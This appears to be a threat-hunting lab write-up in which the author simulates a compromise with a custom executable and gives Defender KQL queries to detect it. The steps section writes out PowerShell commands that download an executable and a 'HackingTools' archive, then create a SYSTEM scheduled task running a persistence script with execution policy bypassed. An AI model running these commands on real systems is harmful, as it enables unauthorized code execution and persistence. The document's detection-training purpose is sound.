# Threat Hunting Scenario (System Compromise)
**Threat Actor Malicious File Download and Malicious File Execution**

### `MaliciousExecutable.exe` Creation and Purpose

The "malicious" executable used within the project was originally written as a PowerShell script and converted into an exectuable using `PS2EXE` (https://github.com/MScholtes/PS2EXE). The intention of the executable was to emulate possible actions a threat actor would undertake once inside a system. I wanted the the executable to perform several commands to populate the `Microsoft Defender for Endpoint` logs. To add another layer of realism to the project, I obfuscated the commands to "challenge" and test a threat hunter's knowledge and resourcefulness. While there were other possible network reconnaissance techniques the executable could have performed, I chose a non-intrusive technique in an attempt to not disrupt other devices and systems in the network. 


## Steps the Threat Actor Took to Create Logs and IoCs:
1. Several failed user logons in quick succession.
2. Opened a PowerShell terminal and executed the command `Invoke-WebRequest -Uri \"https://github.com/AaronRMartinez/Threat-Hunting-Scenario-Compromise/raw/refs/heads/main/MaliciousExecutable.exe\" -OutFile \"$env:USERPROFILE\\Downloads\\MaliciousExecutable.exe\"` to initiate the `MaliciousExecutable.exe` download.
3. Once `MaliciousExecutable.exe` was downloaded, the threat actor simply double-clicked the executable to run it. 
4. When executed, `MaliciousExecutable.exe` ran several encoded PowerShell commands to populate the EDR logs. These commands consisted of:

   - First Command: `Invoke-WebRequest -Uri "https://github.com/AaronRMartinez/Threat-Hunting-Scenario-Compromise/raw/refs/heads/main/HackingTools.zip" -OutFile "$env:USERPROFILE\Downloads\HackingTools.zip"`

   - Second Command: `Expand-Archive -Path "$env:USERPROFILE\Downloads\HackingTools.zip" -DestinationPath "$env:USERPROFILE\Downloads\HackingTools" -Force`

   - Third Command: `Remove-Item -Path "$env:USERPROFILE\Downloads\HackingTools.zip" -Force`

   - Fourth Command: `schtasks /create /tn "PersistenceScheduledTask" /tr "powershell.exe -ExecutionPolicy Bypass -File $env:USERPROFILE\Downloads\HackingTools\HackingTools\PersistenceScript.ps1" /sc onlogon /ru SYSTEM /f`

   - Fifth Command: `arp -a | Out-File -FilePath "$env:USERPROFILE\Desktop\arp_results.txt"`

The executable downloaded a zip file to the user's Downloads file, extracted the contents, and deleted the artifact created by the extraction process. The executable created a scheduled task to mimic the actions a threat actor would perform to gain persistence on the system and conducted non-intrusive network reconnaissance.   

---

## Tables Used to Detect IoCs:
| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceLogonEvents|
| **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceinfo-table|
| **Purpose**| Used to detect a high number of failed logon attempts on a system. |

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceEvents|
| **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceinfo-table|
| **Purpose**| Used to gain a general overview of a system to observe if any malicious activity is occurring.|

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceProcesskEvents|
| **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table|
| **Purpose**| Used to detect any commands executed by either the threat actor or malicious files.|

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceNetworkEvents|
| **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table|
| **Purpose**| Used to detect any network connections that could suggest possible file downloads.|

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceFileEvents|
| **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table|
| **Purpose**| Used to detect any malicious file creation occurring on the system.|

---

## Related Queries:
```kql
// Detect failed and successful logon attempts for the "aaronmart" account on the endpoint "arm-thcompromis"
DeviceLogonEvents
| where DeviceName == "arm-thcompromis"
| project Timestamp, DeviceName, ActionType, LogonType, AccountName, FailureReason

// "MaliciousExecutable.exe" being downloaded by threat actor
// PowerShell command executing this action contained the "Invoke-WebRequest" command
DeviceEvents
| where DeviceName == "arm-thcompromis"
| where Timestamp > datetime(2025-03-15T15:02:10.5325975Z)
| where ActionType == "PowerShellCommand"
| where AdditionalFields contains "Invoke-WebRequest"
| project Timestamp, InitiatingProcessAccountName, InitiatingProcessId, InitiatingProcessCommandLine, AdditionalFields

// "MaliciousExecutable.exe" was successfully installed and is present on the disk
DeviceFileEvents
| where FileName has_any ("MaliciousExecutable.exe")
| project  Timestamp, DeviceName, RequestAccountName, ActionType, InitiatingProcessCommandLine

// "MaliciousExecutable.exe" was executed
DeviceProcessEvents
| where ProcessCommandLine has_any("MaliciousExecutable.exe")
| project  Timestamp, DeviceName, AccountName, ActionType, ProcessCommandLine

// "MaliciousExectuable.exe" executing the PowerShell commands
DeviceProcessEvents
| where DeviceName == "arm-thcompromis"
| where InitiatingProcessFileName == "maliciousexecutable.exe"
| order by Timestamp asc
| project Timestamp, ActionType, FileName, ProcessCommandLine

// "MaliciousExecutable.exe" creating a scheduled task
DeviceEvents
| where InitiatingProcessFileName == "maliciousexecutable.exe"
| where FileName == "schtasks.exe"
| order by Timestamp asc
| project Timestamp, InitiatingProcessAccountName, InitiatingProcessId, InitiatingProcessCommandLine, AdditionalFields

// "MaliciousExecutable.exe" saving the "arp -a" results in a text file
DeviceFileEvents
| where FileName == "arp_results.txt"
| project  Timestamp, DeviceName, RequestAccountName, ActionType, InitiatingProcessCommandLine
```

---

## Created By:
- **Author Name**: Aaron Martinez
- **Author Contact**: https://www.linkedin.com/in/aaron-m-59725a332/
- **Date**: March 16, 2025

## Validated By:
- **Reviewer Name**: 
- **Reviewer Contact**: 
- **Validation Date**: 

---

## Additional Notes:
- **None**

---

## Revision History:
| **Version** | **Changes**                   | **Date**         | **Modified By**   |
|-------------|-------------------------------|------------------|-------------------|
| 1.0         | Initial draft                  | `March  16, 2025`  | `Aaron Martinez`   
